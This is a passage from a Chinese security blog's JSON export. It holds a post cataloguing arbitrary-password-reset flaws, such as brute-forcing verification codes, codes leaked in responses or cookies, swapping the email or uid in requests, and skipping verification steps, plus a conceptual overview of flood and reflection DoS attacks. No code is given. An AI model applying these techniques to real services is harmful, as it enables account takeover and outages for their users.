跳过验证步骤\n\n输入重置账号后，可跳过验证步骤，直接访问重置密码页面。\n\n在第一步正常输入需要重置的账号。\n\n![0x04_1](/img/Web/20190509/0x04_1.png)\n\n在第二步直接访问重置密码的链接。retrievepasswordmobile.html\n\n![0x04_2](/img/Web/20190509/0x04_2.png)\n\n绕过验证码直接来到了重置密码的第三步。\n\n![0x04_3](/img/Web/20190509/0x04_3.png)\n\n重置密码。\n\n![0x04_4](/img/Web/20190509/0x04_4.png)\n\n## 0x05 修改验证邮箱\n\n账户重置密码需要从邮箱获取验证，能够修改邮箱为自己的邮箱。\n\n![0x05_1](/img/Web/20190509/0x05_1.png)\n\n在数据包中将邮箱地址修改为自己的邮箱。\n\n![0x05_2](/img/Web/20190509/0x05_2.png)\n\n从邮箱中获取验证码后进入修改密码。\n\n![0x05_3](/img/Web/20190509/0x05_3.png)\n\n![0x05_4](/img/Web/20190509/0x05_4.png)\n\n## 0x06 重置密码最后一步uid可控\n\n重置密码最后一步uid可控，可以通过该参数重置任意账户密码\n\n用已有账户接受验证码\n\n![0x06_1](/img/Web/20190509/0x06_1.png)\n\n最后一步修改请求包中可修改代表用户身份的uid，修改为任意用户uid。\n\n![0x06_2](/img/Web/20190509/0x06_2.png)\n\n最终自动跳转登陆。\n\n\n\n","source":"_posts/任意用户密码重置.md","raw":"---\ntitle: 任意用户密码重置\ndate: 2019-05-09 10:04:47\ntags: [知识点]\ncategories: 整理\n---\n\n# 任意用户密码重置姿势\n\n## 0x00 前言\n\n这里记录一些实战中碰到的一些任意密码重置的案例。\n\n## 0x01 验证码暴力破解\n\n这类是最常见的任意密码重置问题了。由于服务端没有对访问做限制，同时验证码过多而且生存周期较长，导致可以爆破处验证码，对任意用户账号进行重置。\n\n在找回密码发送验证码后，填写任意验证码进行爆破。\n\n![0x01_1](/img/Web/20190509/0x01_1.png)\n\n爆破出验证码后即可重置密码\n\n​\t![0x01_2](/img/Web/20190509/0x01_2.png)\n\n## 0x02 验证码被返回\n\n### 验证码直接返回\n\n最常见的一类是验证码直接被返回给前端。如下图所示：\n\n![0x02_1_1](/img/Web/20190509/0x02_1_1.png)\n\n填写返回的验证码。\n\n![0x02_1_2](/img/Web/20190509/0x02_1_2.png)\n\n### 验证码返回在Cookie中\n\n![0x02_2_1](/img/Web/20190509/0x02_2_1.png)\n\n发送验证码并抓取返回包。发现返回包中设置的Cookie存在phoneCode字段:885042，猜测为验证码。输入验证码重置。修改成功。\n\n![0x02_2](/img/Web/20190509/0x02_2_2.png)\n\n![0x02_3](/img/Web/20190509/0x02_2_3.png)\n\n## 0x03 没有验证接受验证码的账号是否与被修改密码账号一致\n\n下面案例先用账号接受验证码后，再请求包中修改邮箱为受害者邮箱。\n\n![0x03_1](/img/Web/20190509/0x03_1.png)\n\n成功修改密码。\n\n![0x03_2](/img/Web/20190509/0x03_2.png)\n\n## 0x04 跳过验证步骤\n\n输入重置账号后，可跳过验证步骤，直接访问重置密码页面。\n\n在第一步正常输入需要重置的账号。\n\n![0x04_1](/img/Web/20190509/0x04_1.png)\n\n在第二步直接访问重置密码的链接。retrievepasswordmobile.html\n\n![0x04_2](/img/Web/20190509/0x04_2.png)\n\n绕过验证码直接来到了重置密码的第三步。\n\n![0x04_3](/img/Web/20190509/0x04_3.png)\n\n重置密码。\n\n![0x04_4](/img/Web/20190509/0x04_4.png)\n\n## 0x05 修改验证邮箱\n\n账户重置密码需要从邮箱获取验证，能够修改邮箱为自己的邮箱。\n\n![0x05_1](/img/Web/20190509/0x05_1.png)\n\n在数据包中将邮箱地址修改为自己的邮箱。\n\n![0x05_2](/img/Web/20190509/0x05_2.png)\n\n从邮箱中获取验证码后进入修改密码。\n\n![0x05_3](/img/Web/20190509/0x05_3.png)\n\n![0x05_4](/img/Web/20190509/0x05_4.png)\n\n## 0x06 重置密码最后一步uid可控\n\n重置密码最后一步uid可控，可以通过该参数重置任意账户密码\n\n用已有账户接受验证码\n\n![0x06_1](/img/Web/20190509/0x06_1.png)\n\n最后一步修改请求包中可修改代表用户身份的uid，修改为任意用户uid。\n\n![0x06_2](/img/Web/20190509/0x06_2.png)\n\n最终自动跳转登陆。\n\n\n\n","slug":"任意用户密码重置","published":1,"updated":"2019-06-19T17:23:13.402Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istga007n4dsbj6w81a8w","content":"<h1 id=\"任意用户密码重置姿势\"><a href=\"#任意用户密码重置姿势\" class=\"headerlink\" title=\"任意用户密码重置姿势\"></a>任意用户密码重置姿势</h1><h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>这里记录一些实战中碰到的一些任意密码重置的案例。</p>\n<h2 id=\"0x01-验证码暴力破解\"><a href=\"#0x01-验证码暴力破解\" class=\"headerlink\" title=\"0x01 验证码暴力破解\"></a>0x01 验证码暴力破解</h2><p>这类是最常见的任意密码重置问题了。由于服务端没有对访问做限制，同时验证码过多而且生存周期较长，导致可以爆破处验证码，对任意用户账号进行重置。</p>\n<p>在找回密码发送验证码后，填写任意验证码进行爆破。</p>\n<p><img src=\"/img/Web/20190509/0x01_1.png\" alt=\"0x01_1\"></p>\n<p>爆破出验证码后即可重置密码</p>\n<p>​    <img src=\"/img/Web/20190509/0x01_2.png\" alt=\"0x01_2\"></p>\n<h2 id=\"0x02-验证码被返回\"><a href=\"#0x02-验证码被返回\" class=\"headerlink\" title=\"0x02 验证码被返回\"></a>0x02 验证码被返回</h2><h3 id=\"验证码直接返回\"><a href=\"#验证码直接返回\" class=\"headerlink\" title=\"验证码直接返回\"></a>验证码直接返回</h3><p>最常见的一类是验证码直接被返回给前端。如下图所示：</p>\n<p><img src=\"/img/Web/20190509/0x02_1_1.png\" alt=\"0x02_1_1\"></p>\n<p>填写返回的验证码。</p>\n<p><img src=\"/img/Web/20190509/0x02_1_2.png\" alt=\"0x02_1_2\"></p>\n<h3 id=\"验证码返回在Cookie中\"><a href=\"#验证码返回在Cookie中\" class=\"headerlink\" title=\"验证码返回在Cookie中\"></a>验证码返回在Cookie中</h3><p><img src=\"/img/Web/20190509/0x02_2_1.png\" alt=\"0x02_2_1\"></p>\n<p>发送验证码并抓取返回包。发现返回包中设置的Cookie存在phoneCode字段:885042，猜测为验证码。输入验证码重置。修改成功。</p>\n<p><img src=\"/img/Web/20190509/0x02_2_2.png\" alt=\"0x02_2\"></p>\n<p><img src=\"/img/Web/20190509/0x02_2_3.png\" alt=\"0x02_3\"></p>\n<h2 id=\"0x03-没有验证接受验证码的账号是否与被修改密码账号一致\"><a href=\"#0x03-没有验证接受验证码的账号是否与被修改密码账号一致\" class=\"headerlink\" title=\"0x03 没有验证接受验证码的账号是否与被修改密码账号一致\"></a>0x03 没有验证接受验证码的账号是否与被修改密码账号一致</h2><p>下面案例先用账号接受验证码后，再请求包中修改邮箱为受害者邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x03_1.png\" alt=\"0x03_1\"></p>\n<p>成功修改密码。</p>\n<p><img src=\"/img/Web/20190509/0x03_2.png\" alt=\"0x03_2\"></p>\n<h2 id=\"0x04-跳过验证步骤\"><a href=\"#0x04-跳过验证步骤\" class=\"headerlink\" title=\"0x04 跳过验证步骤\"></a>0x04 跳过验证步骤</h2><p>输入重置账号后，可跳过验证步骤，直接访问重置密码页面。</p>\n<p>在第一步正常输入需要重置的账号。</p>\n<p><img src=\"/img/Web/20190509/0x04_1.png\" alt=\"0x04_1\"></p>\n<p>在第二步直接访问重置密码的链接。retrievepasswordmobile.html</p>\n<p><img src=\"/img/Web/20190509/0x04_2.png\" alt=\"0x04_2\"></p>\n<p>绕过验证码直接来到了重置密码的第三步。</p>\n<p><img src=\"/img/Web/20190509/0x04_3.png\" alt=\"0x04_3\"></p>\n<p>重置密码。</p>\n<p><img src=\"/img/Web/20190509/0x04_4.png\" alt=\"0x04_4\"></p>\n<h2 id=\"0x05-修改验证邮箱\"><a href=\"#0x05-修改验证邮箱\" class=\"headerlink\" title=\"0x05 修改验证邮箱\"></a>0x05 修改验证邮箱</h2><p>账户重置密码需要从邮箱获取验证，能够修改邮箱为自己的邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x05_1.png\" alt=\"0x05_1\"></p>\n<p>在数据包中将邮箱地址修改为自己的邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x05_2.png\" alt=\"0x05_2\"></p>\n<p>从邮箱中获取验证码后进入修改密码。</p>\n<p><img src=\"/img/Web/20190509/0x05_3.png\" alt=\"0x05_3\"></p>\n<p><img src=\"/img/Web/20190509/0x05_4.png\" alt=\"0x05_4\"></p>\n<h2 id=\"0x06-重置密码最后一步uid可控\"><a href=\"#0x06-重置密码最后一步uid可控\" class=\"headerlink\" title=\"0x06 重置密码最后一步uid可控\"></a>0x06 重置密码最后一步uid可控</h2><p>重置密码最后一步uid可控，可以通过该参数重置任意账户密码</p>\n<p>用已有账户接受验证码</p>\n<p><img src=\"/img/Web/20190509/0x06_1.png\" alt=\"0x06_1\"></p>\n<p>最后一步修改请求包中可修改代表用户身份的uid，修改为任意用户uid。</p>\n<p><img src=\"/img/Web/20190509/0x06_2.png\" alt=\"0x06_2\"></p>\n<p>最终自动跳转登陆。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"任意用户密码重置姿势\"><a href=\"#任意用户密码重置姿势\" class=\"headerlink\" title=\"任意用户密码重置姿势\"></a>任意用户密码重置姿势</h1><h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>这里记录一些实战中碰到的一些任意密码重置的案例。</p>\n<h2 id=\"0x01-验证码暴力破解\"><a href=\"#0x01-验证码暴力破解\" class=\"headerlink\" title=\"0x01 验证码暴力破解\"></a>0x01 验证码暴力破解</h2><p>这类是最常见的任意密码重置问题了。由于服务端没有对访问做限制，同时验证码过多而且生存周期较长，导致可以爆破处验证码，对任意用户账号进行重置。</p>\n<p>在找回密码发送验证码后，填写任意验证码进行爆破。</p>\n<p><img src=\"/img/Web/20190509/0x01_1.png\" alt=\"0x01_1\"></p>\n<p>爆破出验证码后即可重置密码</p>\n<p>​    <img src=\"/img/Web/20190509/0x01_2.png\" alt=\"0x01_2\"></p>\n<h2 id=\"0x02-验证码被返回\"><a href=\"#0x02-验证码被返回\" class=\"headerlink\" title=\"0x02 验证码被返回\"></a>0x02 验证码被返回</h2><h3 id=\"验证码直接返回\"><a href=\"#验证码直接返回\" class=\"headerlink\" title=\"验证码直接返回\"></a>验证码直接返回</h3><p>最常见的一类是验证码直接被返回给前端。如下图所示：</p>\n<p><img src=\"/img/Web/20190509/0x02_1_1.png\" alt=\"0x02_1_1\"></p>\n<p>填写返回的验证码。</p>\n<p><img src=\"/img/Web/20190509/0x02_1_2.png\" alt=\"0x02_1_2\"></p>\n<h3 id=\"验证码返回在Cookie中\"><a href=\"#验证码返回在Cookie中\" class=\"headerlink\" title=\"验证码返回在Cookie中\"></a>验证码返回在Cookie中</h3><p><img src=\"/img/Web/20190509/0x02_2_1.png\" alt=\"0x02_2_1\"></p>\n<p>发送验证码并抓取返回包。发现返回包中设置的Cookie存在phoneCode字段:885042，猜测为验证码。输入验证码重置。修改成功。</p>\n<p><img src=\"/img/Web/20190509/0x02_2_2.png\" alt=\"0x02_2\"></p>\n<p><img src=\"/img/Web/20190509/0x02_2_3.png\" alt=\"0x02_3\"></p>\n<h2 id=\"0x03-没有验证接受验证码的账号是否与被修改密码账号一致\"><a href=\"#0x03-没有验证接受验证码的账号是否与被修改密码账号一致\" class=\"headerlink\" title=\"0x03 没有验证接受验证码的账号是否与被修改密码账号一致\"></a>0x03 没有验证接受验证码的账号是否与被修改密码账号一致</h2><p>下面案例先用账号接受验证码后，再请求包中修改邮箱为受害者邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x03_1.png\" alt=\"0x03_1\"></p>\n<p>成功修改密码。</p>\n<p><img src=\"/img/Web/20190509/0x03_2.png\" alt=\"0x03_2\"></p>\n<h2 id=\"0x04-跳过验证步骤\"><a href=\"#0x04-跳过验证步骤\" class=\"headerlink\" title=\"0x04 跳过验证步骤\"></a>0x04 跳过验证步骤</h2><p>输入重置账号后，可跳过验证步骤，直接访问重置密码页面。</p>\n<p>在第一步正常输入需要重置的账号。</p>\n<p><img src=\"/img/Web/20190509/0x04_1.png\" alt=\"0x04_1\"></p>\n<p>在第二步直接访问重置密码的链接。retrievepasswordmobile.html</p>\n<p><img src=\"/img/Web/20190509/0x04_2.png\" alt=\"0x04_2\"></p>\n<p>绕过验证码直接来到了重置密码的第三步。</p>\n<p><img src=\"/img/Web/20190509/0x04_3.png\" alt=\"0x04_3\"></p>\n<p>重置密码。</p>\n<p><img src=\"/img/Web/20190509/0x04_4.png\" alt=\"0x04_4\"></p>\n<h2 id=\"0x05-修改验证邮箱\"><a href=\"#0x05-修改验证邮箱\" class=\"headerlink\" title=\"0x05 修改验证邮箱\"></a>0x05 修改验证邮箱</h2><p>账户重置密码需要从邮箱获取验证，能够修改邮箱为自己的邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x05_1.png\" alt=\"0x05_1\"></p>\n<p>在数据包中将邮箱地址修改为自己的邮箱。</p>\n<p><img src=\"/img/Web/20190509/0x05_2.png\" alt=\"0x05_2\"></p>\n<p>从邮箱中获取验证码后进入修改密码。</p>\n<p><img src=\"/img/Web/20190509/0x05_3.png\" alt=\"0x05_3\"></p>\n<p><img src=\"/img/Web/20190509/0x05_4.png\" alt=\"0x05_4\"></p>\n<h2 id=\"0x06-重置密码最后一步uid可控\"><a href=\"#0x06-重置密码最后一步uid可控\" class=\"headerlink\" title=\"0x06 重置密码最后一步uid可控\"></a>0x06 重置密码最后一步uid可控</h2><p>重置密码最后一步uid可控，可以通过该参数重置任意账户密码</p>\n<p>用已有账户接受验证码</p>\n<p><img src=\"/img/Web/20190509/0x06_1.png\" alt=\"0x06_1\"></p>\n<p>最后一步修改请求包中可修改代表用户身份的uid，修改为任意用户uid。</p>\n<p><img src=\"/img/Web/20190509/0x06_2.png\" alt=\"0x06_2\"></p>\n<p>最终自动跳转登陆。</p>\n"},{"title":"拒绝服务攻击","date":"2019-01-09T12:21:15.000Z","_content":"\n# 拒绝服务攻击\n\n---\n\n\n- **DoS（Denial of Service）：拒绝服务**\n\n  短时间内对目标服务器产生大量请求，使服务器链路拥塞或忙于处理攻击请求，导致服务暂时中断或停止，使其他用户无法访问\n\n- **DDoS（Distributed Denial of Service）：分布式拒绝服务**\n\t通过很多\"僵尸主机\"向受害主机发送大量看似正常的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务。\n\n## 拒绝服务攻击分类\n### 网络层拒绝攻击\n#### UDP-Flood\n利用UDP协议的无连接性，针对服务器开放的UDP端口发送大量伪造源IP地址的小包或大包进行攻击。\n#### ICMP-Flood(Ping-Flood)\n通过尽可能地快速发送ICMP数据包给受害者计算机，使受害者带宽不足或系统性能不够，影响正常用户的访问。\n#### TCP-Flood\nTCP攻击俗称SYN泛洪，利用TCP三次握手协议来攻击计算机，主要是通过伪造大量IP的半连接去攻击对方系统。\n### 应用层拒绝服务\n#### CC攻击（HTTP-FLOOP）\n攻击者操纵网络上的肉鸡进行海量的http request攻击，造成服务器资源耗尽，直到宕机崩溃。\n#### slow http post\n也称为slow body，先将HTTP Header中的Content-Length设置为一个较大的值，并在HTTP BODY中以非常缓慢的速度一个字节一个字节的向Web服务器发送，导致服务器一直处于等待状态中。\n#### Slowloris\n也称为slow headers，攻击者始终构造不完整的http header(非正常的\\r\\n结尾)发送，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态。\n### 反射放大攻击\n反射：正常的UDP协议中客户端发送请求到服务器端，服务器返回响应包到客户端。利用UDP协议的面向无连接，可以对发送请求包的源ip地址进行伪造，把源ip修改成受害者的ip地址，使服务器返回的响应包返回受害者的IP。这就是反射攻击。\n放大：利用一个小的请求包来获取一个甚至多个大的响应包。\n\n#### SNMP协议\n攻击者发送大量伪造IP(受害者IP)的GETBULK请求给开启了SNMP服务的设备，设备会将查询的结果返回给受害者IP。这里就是利用SNMP来进行了一个放大的功能。\n\n#### DNS反射\n正常流程：源IP地址--DNS查询--DNS服务器--DNS回复包--源IP地址\n攻击流程：伪造IP地址(受害者IP)--DNS查询--DNS服务器--DNS回复包--伪造的IP地址(攻击目标)\n\n#### NTP反射 \nNTP是Network Time Protocol。能够在网络连接延时不稳定时，将不同设备通过分组交换进行时钟同步。\n反射原因：NTP（server 4.4.7p26之前版本）默认提供monlist功能（该功能用于监控NTP服务器），NTP服务器响应monlist后会返回与NTP服务器进行过时间同步的最后600个客户端IP。\n\n#### Memcached\nMemcached是一款免费且开源的高性能分布式内存缓存系统，旨在通过减轻数据库负载来加速运行动态Web应用程序。\n攻击流程：伪造IP地址(受害者IP)--发送请求到memcached服务器（11211端口）--回复放大万倍的包--伪造的IP地址(攻击目标)\n\n案例：Github于2018年2月28遭受Memcached DDOS攻击，达到1.35Tbps（兆兆位/秒）的流量访问\n#### CLDAP\n#### SSDP\n\n## 协议攻击\n### SYN-FLOOD\n正常流程：客户端发送SYN，服务端响应SYN+ACK，客户端回传ACK+1。\n攻击流程：受控主机伪造源IP发送大量TCP SYN报文，使服务器打开大量的半开放连接，占满服务器的连接表，影响正常用户与服务器建立会话，造成拒绝服务。\n\n#### ACK-Flood \n攻击原理：伪造SYN+ACK包发送给目标主机，目标主机查看TCP连接表有无ACK连接，有则发送ACK包完成TCP连接，无则发送ACK+RSY断开。在查询的过程中会消耗CPU资源，攻击者通过大量发送SYN+ACK包来打摊服务器。\n\n#### Sockstress攻击\n建立三次握手中，第三次发送ACK时，将TCP滑动窗口大小修改为0，服务器发现后会停止数据传输并询问TCP窗口是否更新，导致服务器一直维持等待数据发送和探测窗口更新。\n\n#### SSL-Flood\n通过SSL连接并握手后，不断重新协商来建立新的秘钥，而服务端消耗的资源是客户端的15倍，使服务器忙于协商秘钥而停止响应。\n\n","source":"_posts/拒绝服务攻击.md","raw":"---\ntitle: 拒绝服务攻击\ndate: 2019-01-09 20:21:15\ntags: [知识点]\ncategories: 整理\n---\n\n# 拒绝服务攻击\n\n---\n\n\n- **DoS（Denial of Service）：拒绝服务**\n\n  短时间内对目标服务器产生大量请求，使服务器链路拥塞或忙于处理攻击请求，导致服务暂时中断或停止，使其他用户无法访问\n\n- **DDoS（Distributed Denial of Service）：分布式拒绝服务**\n\t通过很多\"僵尸主机\"向受害主机发送大量看似正常的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务。\n\n## 拒绝服务攻击分类\n### 网络层拒绝攻击\n#### UDP-Flood\n利用UDP协议的无连接性，针对服务器开放的UDP端口发送大量伪造源IP地址的小包或大包进行攻击。\n#### ICMP-Flood(Ping-Flood)\n通过尽可能地快速发送ICMP数据包给受害者计算机，使受害者带宽不足或系统性能不够，影响正常用户的访问。\n#### TCP-Flood\nTCP攻击俗称SYN泛洪，利用TCP三次握手协议来攻击计算机，主要是通过伪造大量IP的半连接去攻击对方系统。\n### 应用层拒绝服务\n#### CC攻击（HTTP-FLOOP）\n攻击者操纵网络上的肉鸡进行海量的http request攻击，造成服务器资源耗尽，直到宕机崩溃。\n#### slow http post\n也称为slow body，先将HTTP Header中的Content-Length设置为一个较大的值，并在HTTP BODY中以非常缓慢的速度一个字节一个字节的向Web服务器发送，导致服务器一直处于等待状态中。\n#### Slowloris\n也称为slow headers，攻击者始终构造不完整的http header(非正常的\\r\\n结尾)发送，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态。\n### 反射放大攻击\n反射：正常的UDP协议中客户端发送请求到服务器端，服务器返回响应包到客户端。利用UDP协议的面向无连接，可以对发送请求包的源ip地址进行伪造，把源ip修改成受害者的ip地址，使服务器返回的响应包返回受害者的IP。这就是反射攻击。\n放大：利用一个小的请求包来获取一个甚至多个大的响应包。\n\n#### SNMP协议\n攻击者发送大量伪造IP(受害者IP)的GETBULK请求给开启了SNMP服务的设备，设备会将查询的结果返回给受害者IP。这里就是利用SNMP来进行了一个放大的功能。\n\n#### DNS反射\n正常流程：源IP地址--DNS查询--DNS服务器--DNS回复包--源IP地址\n攻击流程：伪造IP地址(受害者IP)--DNS查询--DNS服务器--DNS回复包--伪造的IP地址(攻击目标)\n\n#### NTP反射 \nNTP是Network Time Protocol。能够在网络连接延时不稳定时，将不同设备通过分组交换进行时钟同步。\n反射原因：NTP（server 4.4.7p26之前版本）默认提供monlist功能（该功能用于监控NTP服务器），NTP服务器响应monlist后会返回与NTP服务器进行过时间同步的最后600个客户端IP。\n\n#### Memcached\nMemcached是一款免费且开源的高性能分布式内存缓存系统，旨在通过减轻数据库负载来加速运行动态Web应用程序。\n攻击流程：伪造IP地址(受害者IP)--发送请求到memcached服务器（11211端口）--回复放大万倍的包--伪造的IP地址(攻击目标)\n\n案例：Github于2018年2月28遭受Memcached DDOS攻击，达到1.35Tbps（兆兆位/秒）的流量访问\n#### CLDAP\n#### SSDP\n\n## 协议攻击\n### SYN-FLOOD\n正常流程：客户端发送SYN，服务端响应SYN+ACK，客户端回传ACK+1。\n攻击流程：受控主机伪造源IP发送大量TCP SYN报文，使服务器打开大量的半开放连接，占满服务器的连接表，影响正常用户与服务器建立会话，造成拒绝服务。\n\n#### ACK-Flood \n攻击原理：伪造SYN+ACK包发送给目标主机，目标主机查看TCP连接表有无ACK连接，有则发送ACK包完成TCP连接，无则发送ACK+RSY断开。在查询的过程中会消耗CPU资源，攻击者通过大量发送SYN+ACK包来打摊服务器。\n\n#### Sockstress攻击\n建立三次握手中，第三次发送ACK时，将TCP滑动窗口大小修改为0，服务器发现后会停止数据传输并询问TCP窗口是否更新，导致服务器一直维持等待数据发送和探测窗口更新。\n\n#### SSL-Flood\n通过SSL连接并握手后，不断重新协商来建立新的秘钥，而服务端消耗的资源是客户端的15倍，使服务器忙于协商秘钥而停止响应。\n\n","slug":"拒绝服务攻击","published":1,"updated":"2019-06-19T17:23:13.403Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istgc007r4dsbjirtmbjo","content":"<h1 id=\"拒绝服务攻击\"><a href=\"#拒绝服务攻击\" class=\"headerlink\" title=\"拒绝服务攻击\"></a>拒绝服务攻击</h1><hr>\n<ul>\n<li><p><strong>DoS（Denial of Service）：拒绝服务</strong></p>\n<p>短时间内对目标服务器产生大量请求，使服务器链路拥塞或忙于处理攻击请求，导致服务暂时中断或停止，使其他用户无法访问</p>\n</li>\n<li><p><strong>DDoS（Distributed Denial of Service）：分布式拒绝服务</strong><br>  通过很多”僵尸主机”向受害主机发送大量看似正常的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务。</p>\n</li>\n</ul>\n<h2 id=\"拒绝服务攻击分类\"><a href=\"#拒绝服务攻击分类\" class=\"headerlink\" title=\"拒绝服务攻击分类\"></a>拒绝服务攻击分类</h2><h3 id=\"网络层拒绝攻击\"><a href=\"#网络层拒绝攻击\" class=\"headerlink\" title=\"网络层拒绝攻击\"></a>网络层拒绝攻击</h3><h4 id=\"UDP-Flood\"><a href=\"#UDP-Flood\" class=\"headerlink\" title=\"UDP-Flood\"></a>UDP-Flood</h4><p>利用UDP协议的无连接性，针对服务器开放的UDP端口发送大量伪造源IP地址的小包或大包进行攻击。</p>\n<h4 id=\"ICMP-Flood-Ping-Flood\"><a href=\"#ICMP-Flood-Ping-Flood\" class=\"headerlink\" title=\"ICMP-Flood(Ping-Flood)\"></a>ICMP-Flood(Ping-Flood)</h4><p>通过尽可能地快速发送ICMP数据包给受害者计算机，使受害者带宽不足或系统性能不够，影响正常用户的访问。</p>\n<h4 id=\"TCP-Flood\"><a href=\"#TCP-Flood\" class=\"headerlink\" title=\"TCP-Flood\"></a>TCP-Flood</h4><p>TCP攻击俗称SYN泛洪，利用TCP三次握手协议来攻击计算机，主要是通过伪造大量IP的半连接去攻击对方系统。</p>\n<h3 id=\"应用层拒绝服务\"><a href=\"#应用层拒绝服务\" class=\"headerlink\" title=\"应用层拒绝服务\"></a>应用层拒绝服务</h3><h4 id=\"CC攻击（HTTP-FLOOP）\"><a href=\"#CC攻击（HTTP-FLOOP）\" class=\"headerlink\" title=\"CC攻击（HTTP-FLOOP）\"></a>CC攻击（HTTP-FLOOP）</h4><p>攻击者操纵网络上的肉鸡进行海量的http request攻击，造成服务器资源耗尽，直到宕机崩溃。</p>\n<h4 id=\"slow-http-post\"><a href=\"#slow-http-post\" class=\"headerlink\" title=\"slow http post\"></a>slow http post</h4><p>也称为slow body，先将HTTP Header中的Content-Length设置为一个较大的值，并在HTTP BODY中以非常缓慢的速度一个字节一个字节的向Web服务器发送，导致服务器一直处于等待状态中。</p>\n<h4 id=\"Slowloris\"><a href=\"#Slowloris\" class=\"headerlink\" title=\"Slowloris\"></a>Slowloris</h4><p>也称为slow headers，攻击者始终构造不完整的http header(非正常的\\r\\n结尾)发送，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态。</p>\n<h3 id=\"反射放大攻击\"><a href=\"#反射放大攻击\" class=\"headerlink\" title=\"反射放大攻击\"></a>反射放大攻击</h3><p>反射：正常的UDP协议中客户端发送请求到服务器端，服务器返回响应包到客户端。利用UDP协议的面向无连接，可以对发送请求包的源ip地址进行伪造，把源ip修改成受害者的ip地址，使服务器返回的响应包返回受害者的IP。这就是反射攻击。<br>放大：利用一个小的请求包来获取一个甚至多个大的响应包。</p>\n<h4 id=\"SNMP协议\"><a href=\"#SNMP协议\" class=\"headerlink\" title=\"SNMP协议\"></a>SNMP协议</h4><p>攻击者发送大量伪造IP(受害者IP)的GETBULK请求给开启了SNMP服务的设备，设备会将查询的结果返回给受害者IP。这里就是利用SNMP来进行了一个放大的功能。</p>\n<h4 id=\"DNS反射\"><a href=\"#DNS反射\" class=\"headerlink\" title=\"DNS反射\"></a>DNS反射</h4><p>正常流程：源IP地址–DNS查询–DNS服务器–DNS回复包–源IP地址<br>攻击流程：伪造IP地址(受害者IP)–DNS查询–DNS服务器–DNS回复包–伪造的IP地址(攻击目标)</p>\n<h4 id=\"NTP反射\"><a href=\"#NTP反射\" class=\"headerlink\" title=\"NTP反射\"></a>NTP反射</h4><p>NTP是Network Time Protocol。能够在网络连接延时不稳定时，将不同设备通过分组交换进行时钟同步。<br>反射原因：NTP（server 4.4.7p26之前版本）默认提供monlist功能（该功能用于监控NTP服务器），NTP服务器响应monlist后会返回与NTP服务器进行过时间同步的最后600个客户端IP。</p>\n<h4 id=\"Memcached\"><a href=\"#Memcached\" class=\"headerlink\" title=\"Memcached\"></a>Memcached</h4><p>Memcached是一款免费且开源的高性能分布式内存缓存系统，旨在通过减轻数据库负载来加速运行动态Web应用程序。<br>攻击流程：伪造IP地址(受害者IP)–发送请求到memcached服务器（11211端口）–回复放大万倍的包–伪造的IP地址(攻击目标)</p>\n<p>案例：Github于2018年2月28遭受Memcached DDOS攻击，达到1.35Tbps（兆兆位/秒）的流量访问</p>\n<h4 id=\"CLDAP\"><a href=\"#CLDAP\" class=\"headerlink\" title=\"CLDAP\"></a>CLDAP</h4><h4 id=\"SSDP\"><a href=\"#SSDP\" class=\"headerlink\" title=\"SSDP\"></a>SSDP</h4><h2 id=\"协议攻击\"><a href=\"#协议攻击\" class=\"headerlink\" title=\"协议攻击\"></a>协议攻击</h2><h3 id=\"SYN-FLOOD\"><a href=\"#SYN-FLOOD\" class=\"headerlink\" title=\"SYN-FLOOD\"></a>SYN-FLOOD</h3><p>正常流程：客户端发送SYN，服务端响应SYN+ACK，客户端回传ACK+1。<br>攻击流程：受控主机伪造源IP发送大量TCP SYN报文，使服务器打开大量的半开放连接，占满服务器的连接表，影响正常用户与服务器建立会话，造成拒绝服务。</p>\n<h4 id=\"ACK-Flood\"><a href=\"#ACK-Flood\" class=\"headerlink\" title=\"ACK-Flood\"></a>ACK-Flood</h4><p>攻击原理：伪造SYN+ACK包发送给目标主机，目标主机查看TCP连接表有无ACK连接，有则发送ACK包完成TCP连接，无则发送ACK+RSY断开。在查询的过程中会消耗CPU资源，攻击者通过大量发送SYN+ACK包来打摊服务器。</p>\n<h4 id=\"Sockstress攻击\"><a href=\"#Sockstress攻击\" class=\"headerlink\" title=\"Sockstress攻击\"></a>Sockstress攻击</h4><p>建立三次握手中，第三次发送ACK时，将TCP滑动窗口大小修改为0，服务器发现后会停止数据传输并询问TCP窗口是否更新，导致服务器一直维持等待数据发送和探测窗口更新。</p>\n<h4 id=\"SSL-Flood\"><a href=\"#SSL-Flood\" class=\"headerlink\" title=\"SSL-Flood\"></a>SSL-Flood</h4><p>通过SSL连接并握手后，不断重新协商来建立新的秘钥，而服务端消耗的资源是客户端的15倍，使服务器忙于协商秘钥而停止响应。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"拒绝服务攻击\"><a href=\"#拒绝服务攻击\" class=\"headerlink\" title=\"拒绝服务攻击\"></a>拒绝服务攻击</h1><hr>\n<ul>\n<li><p><strong>DoS（Denial of Service）：拒绝服务</strong></p>\n<p>短时间内对目标服务器产生大量请求，使服务器链路拥塞或忙于处理攻击请求，导致服务暂时中断或停止，使其他用户无法访问</p>\n</li>\n<li><p><strong>DDoS（Distributed Denial of Service）：分布式拒绝服务</strong><br>  通过很多”僵尸主机”向受害主机发送大量看似正常的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务。</p>\n</li>\n</ul>\n<h2 id=\"拒绝服务攻击分类\"><a href=\"#拒绝服务攻击分类\" class=\"headerlink\" title=\"拒绝服务攻击分类\"></a>拒绝服务攻击分类</h2><h3 id=\"网络层拒绝攻击\"><a href=\"#网络层拒绝攻击\" class=\"headerlink\" title=\"网络层拒绝攻击\"></a>网络层拒绝攻击</h3><h4 id=\"UDP-Flood\"><a 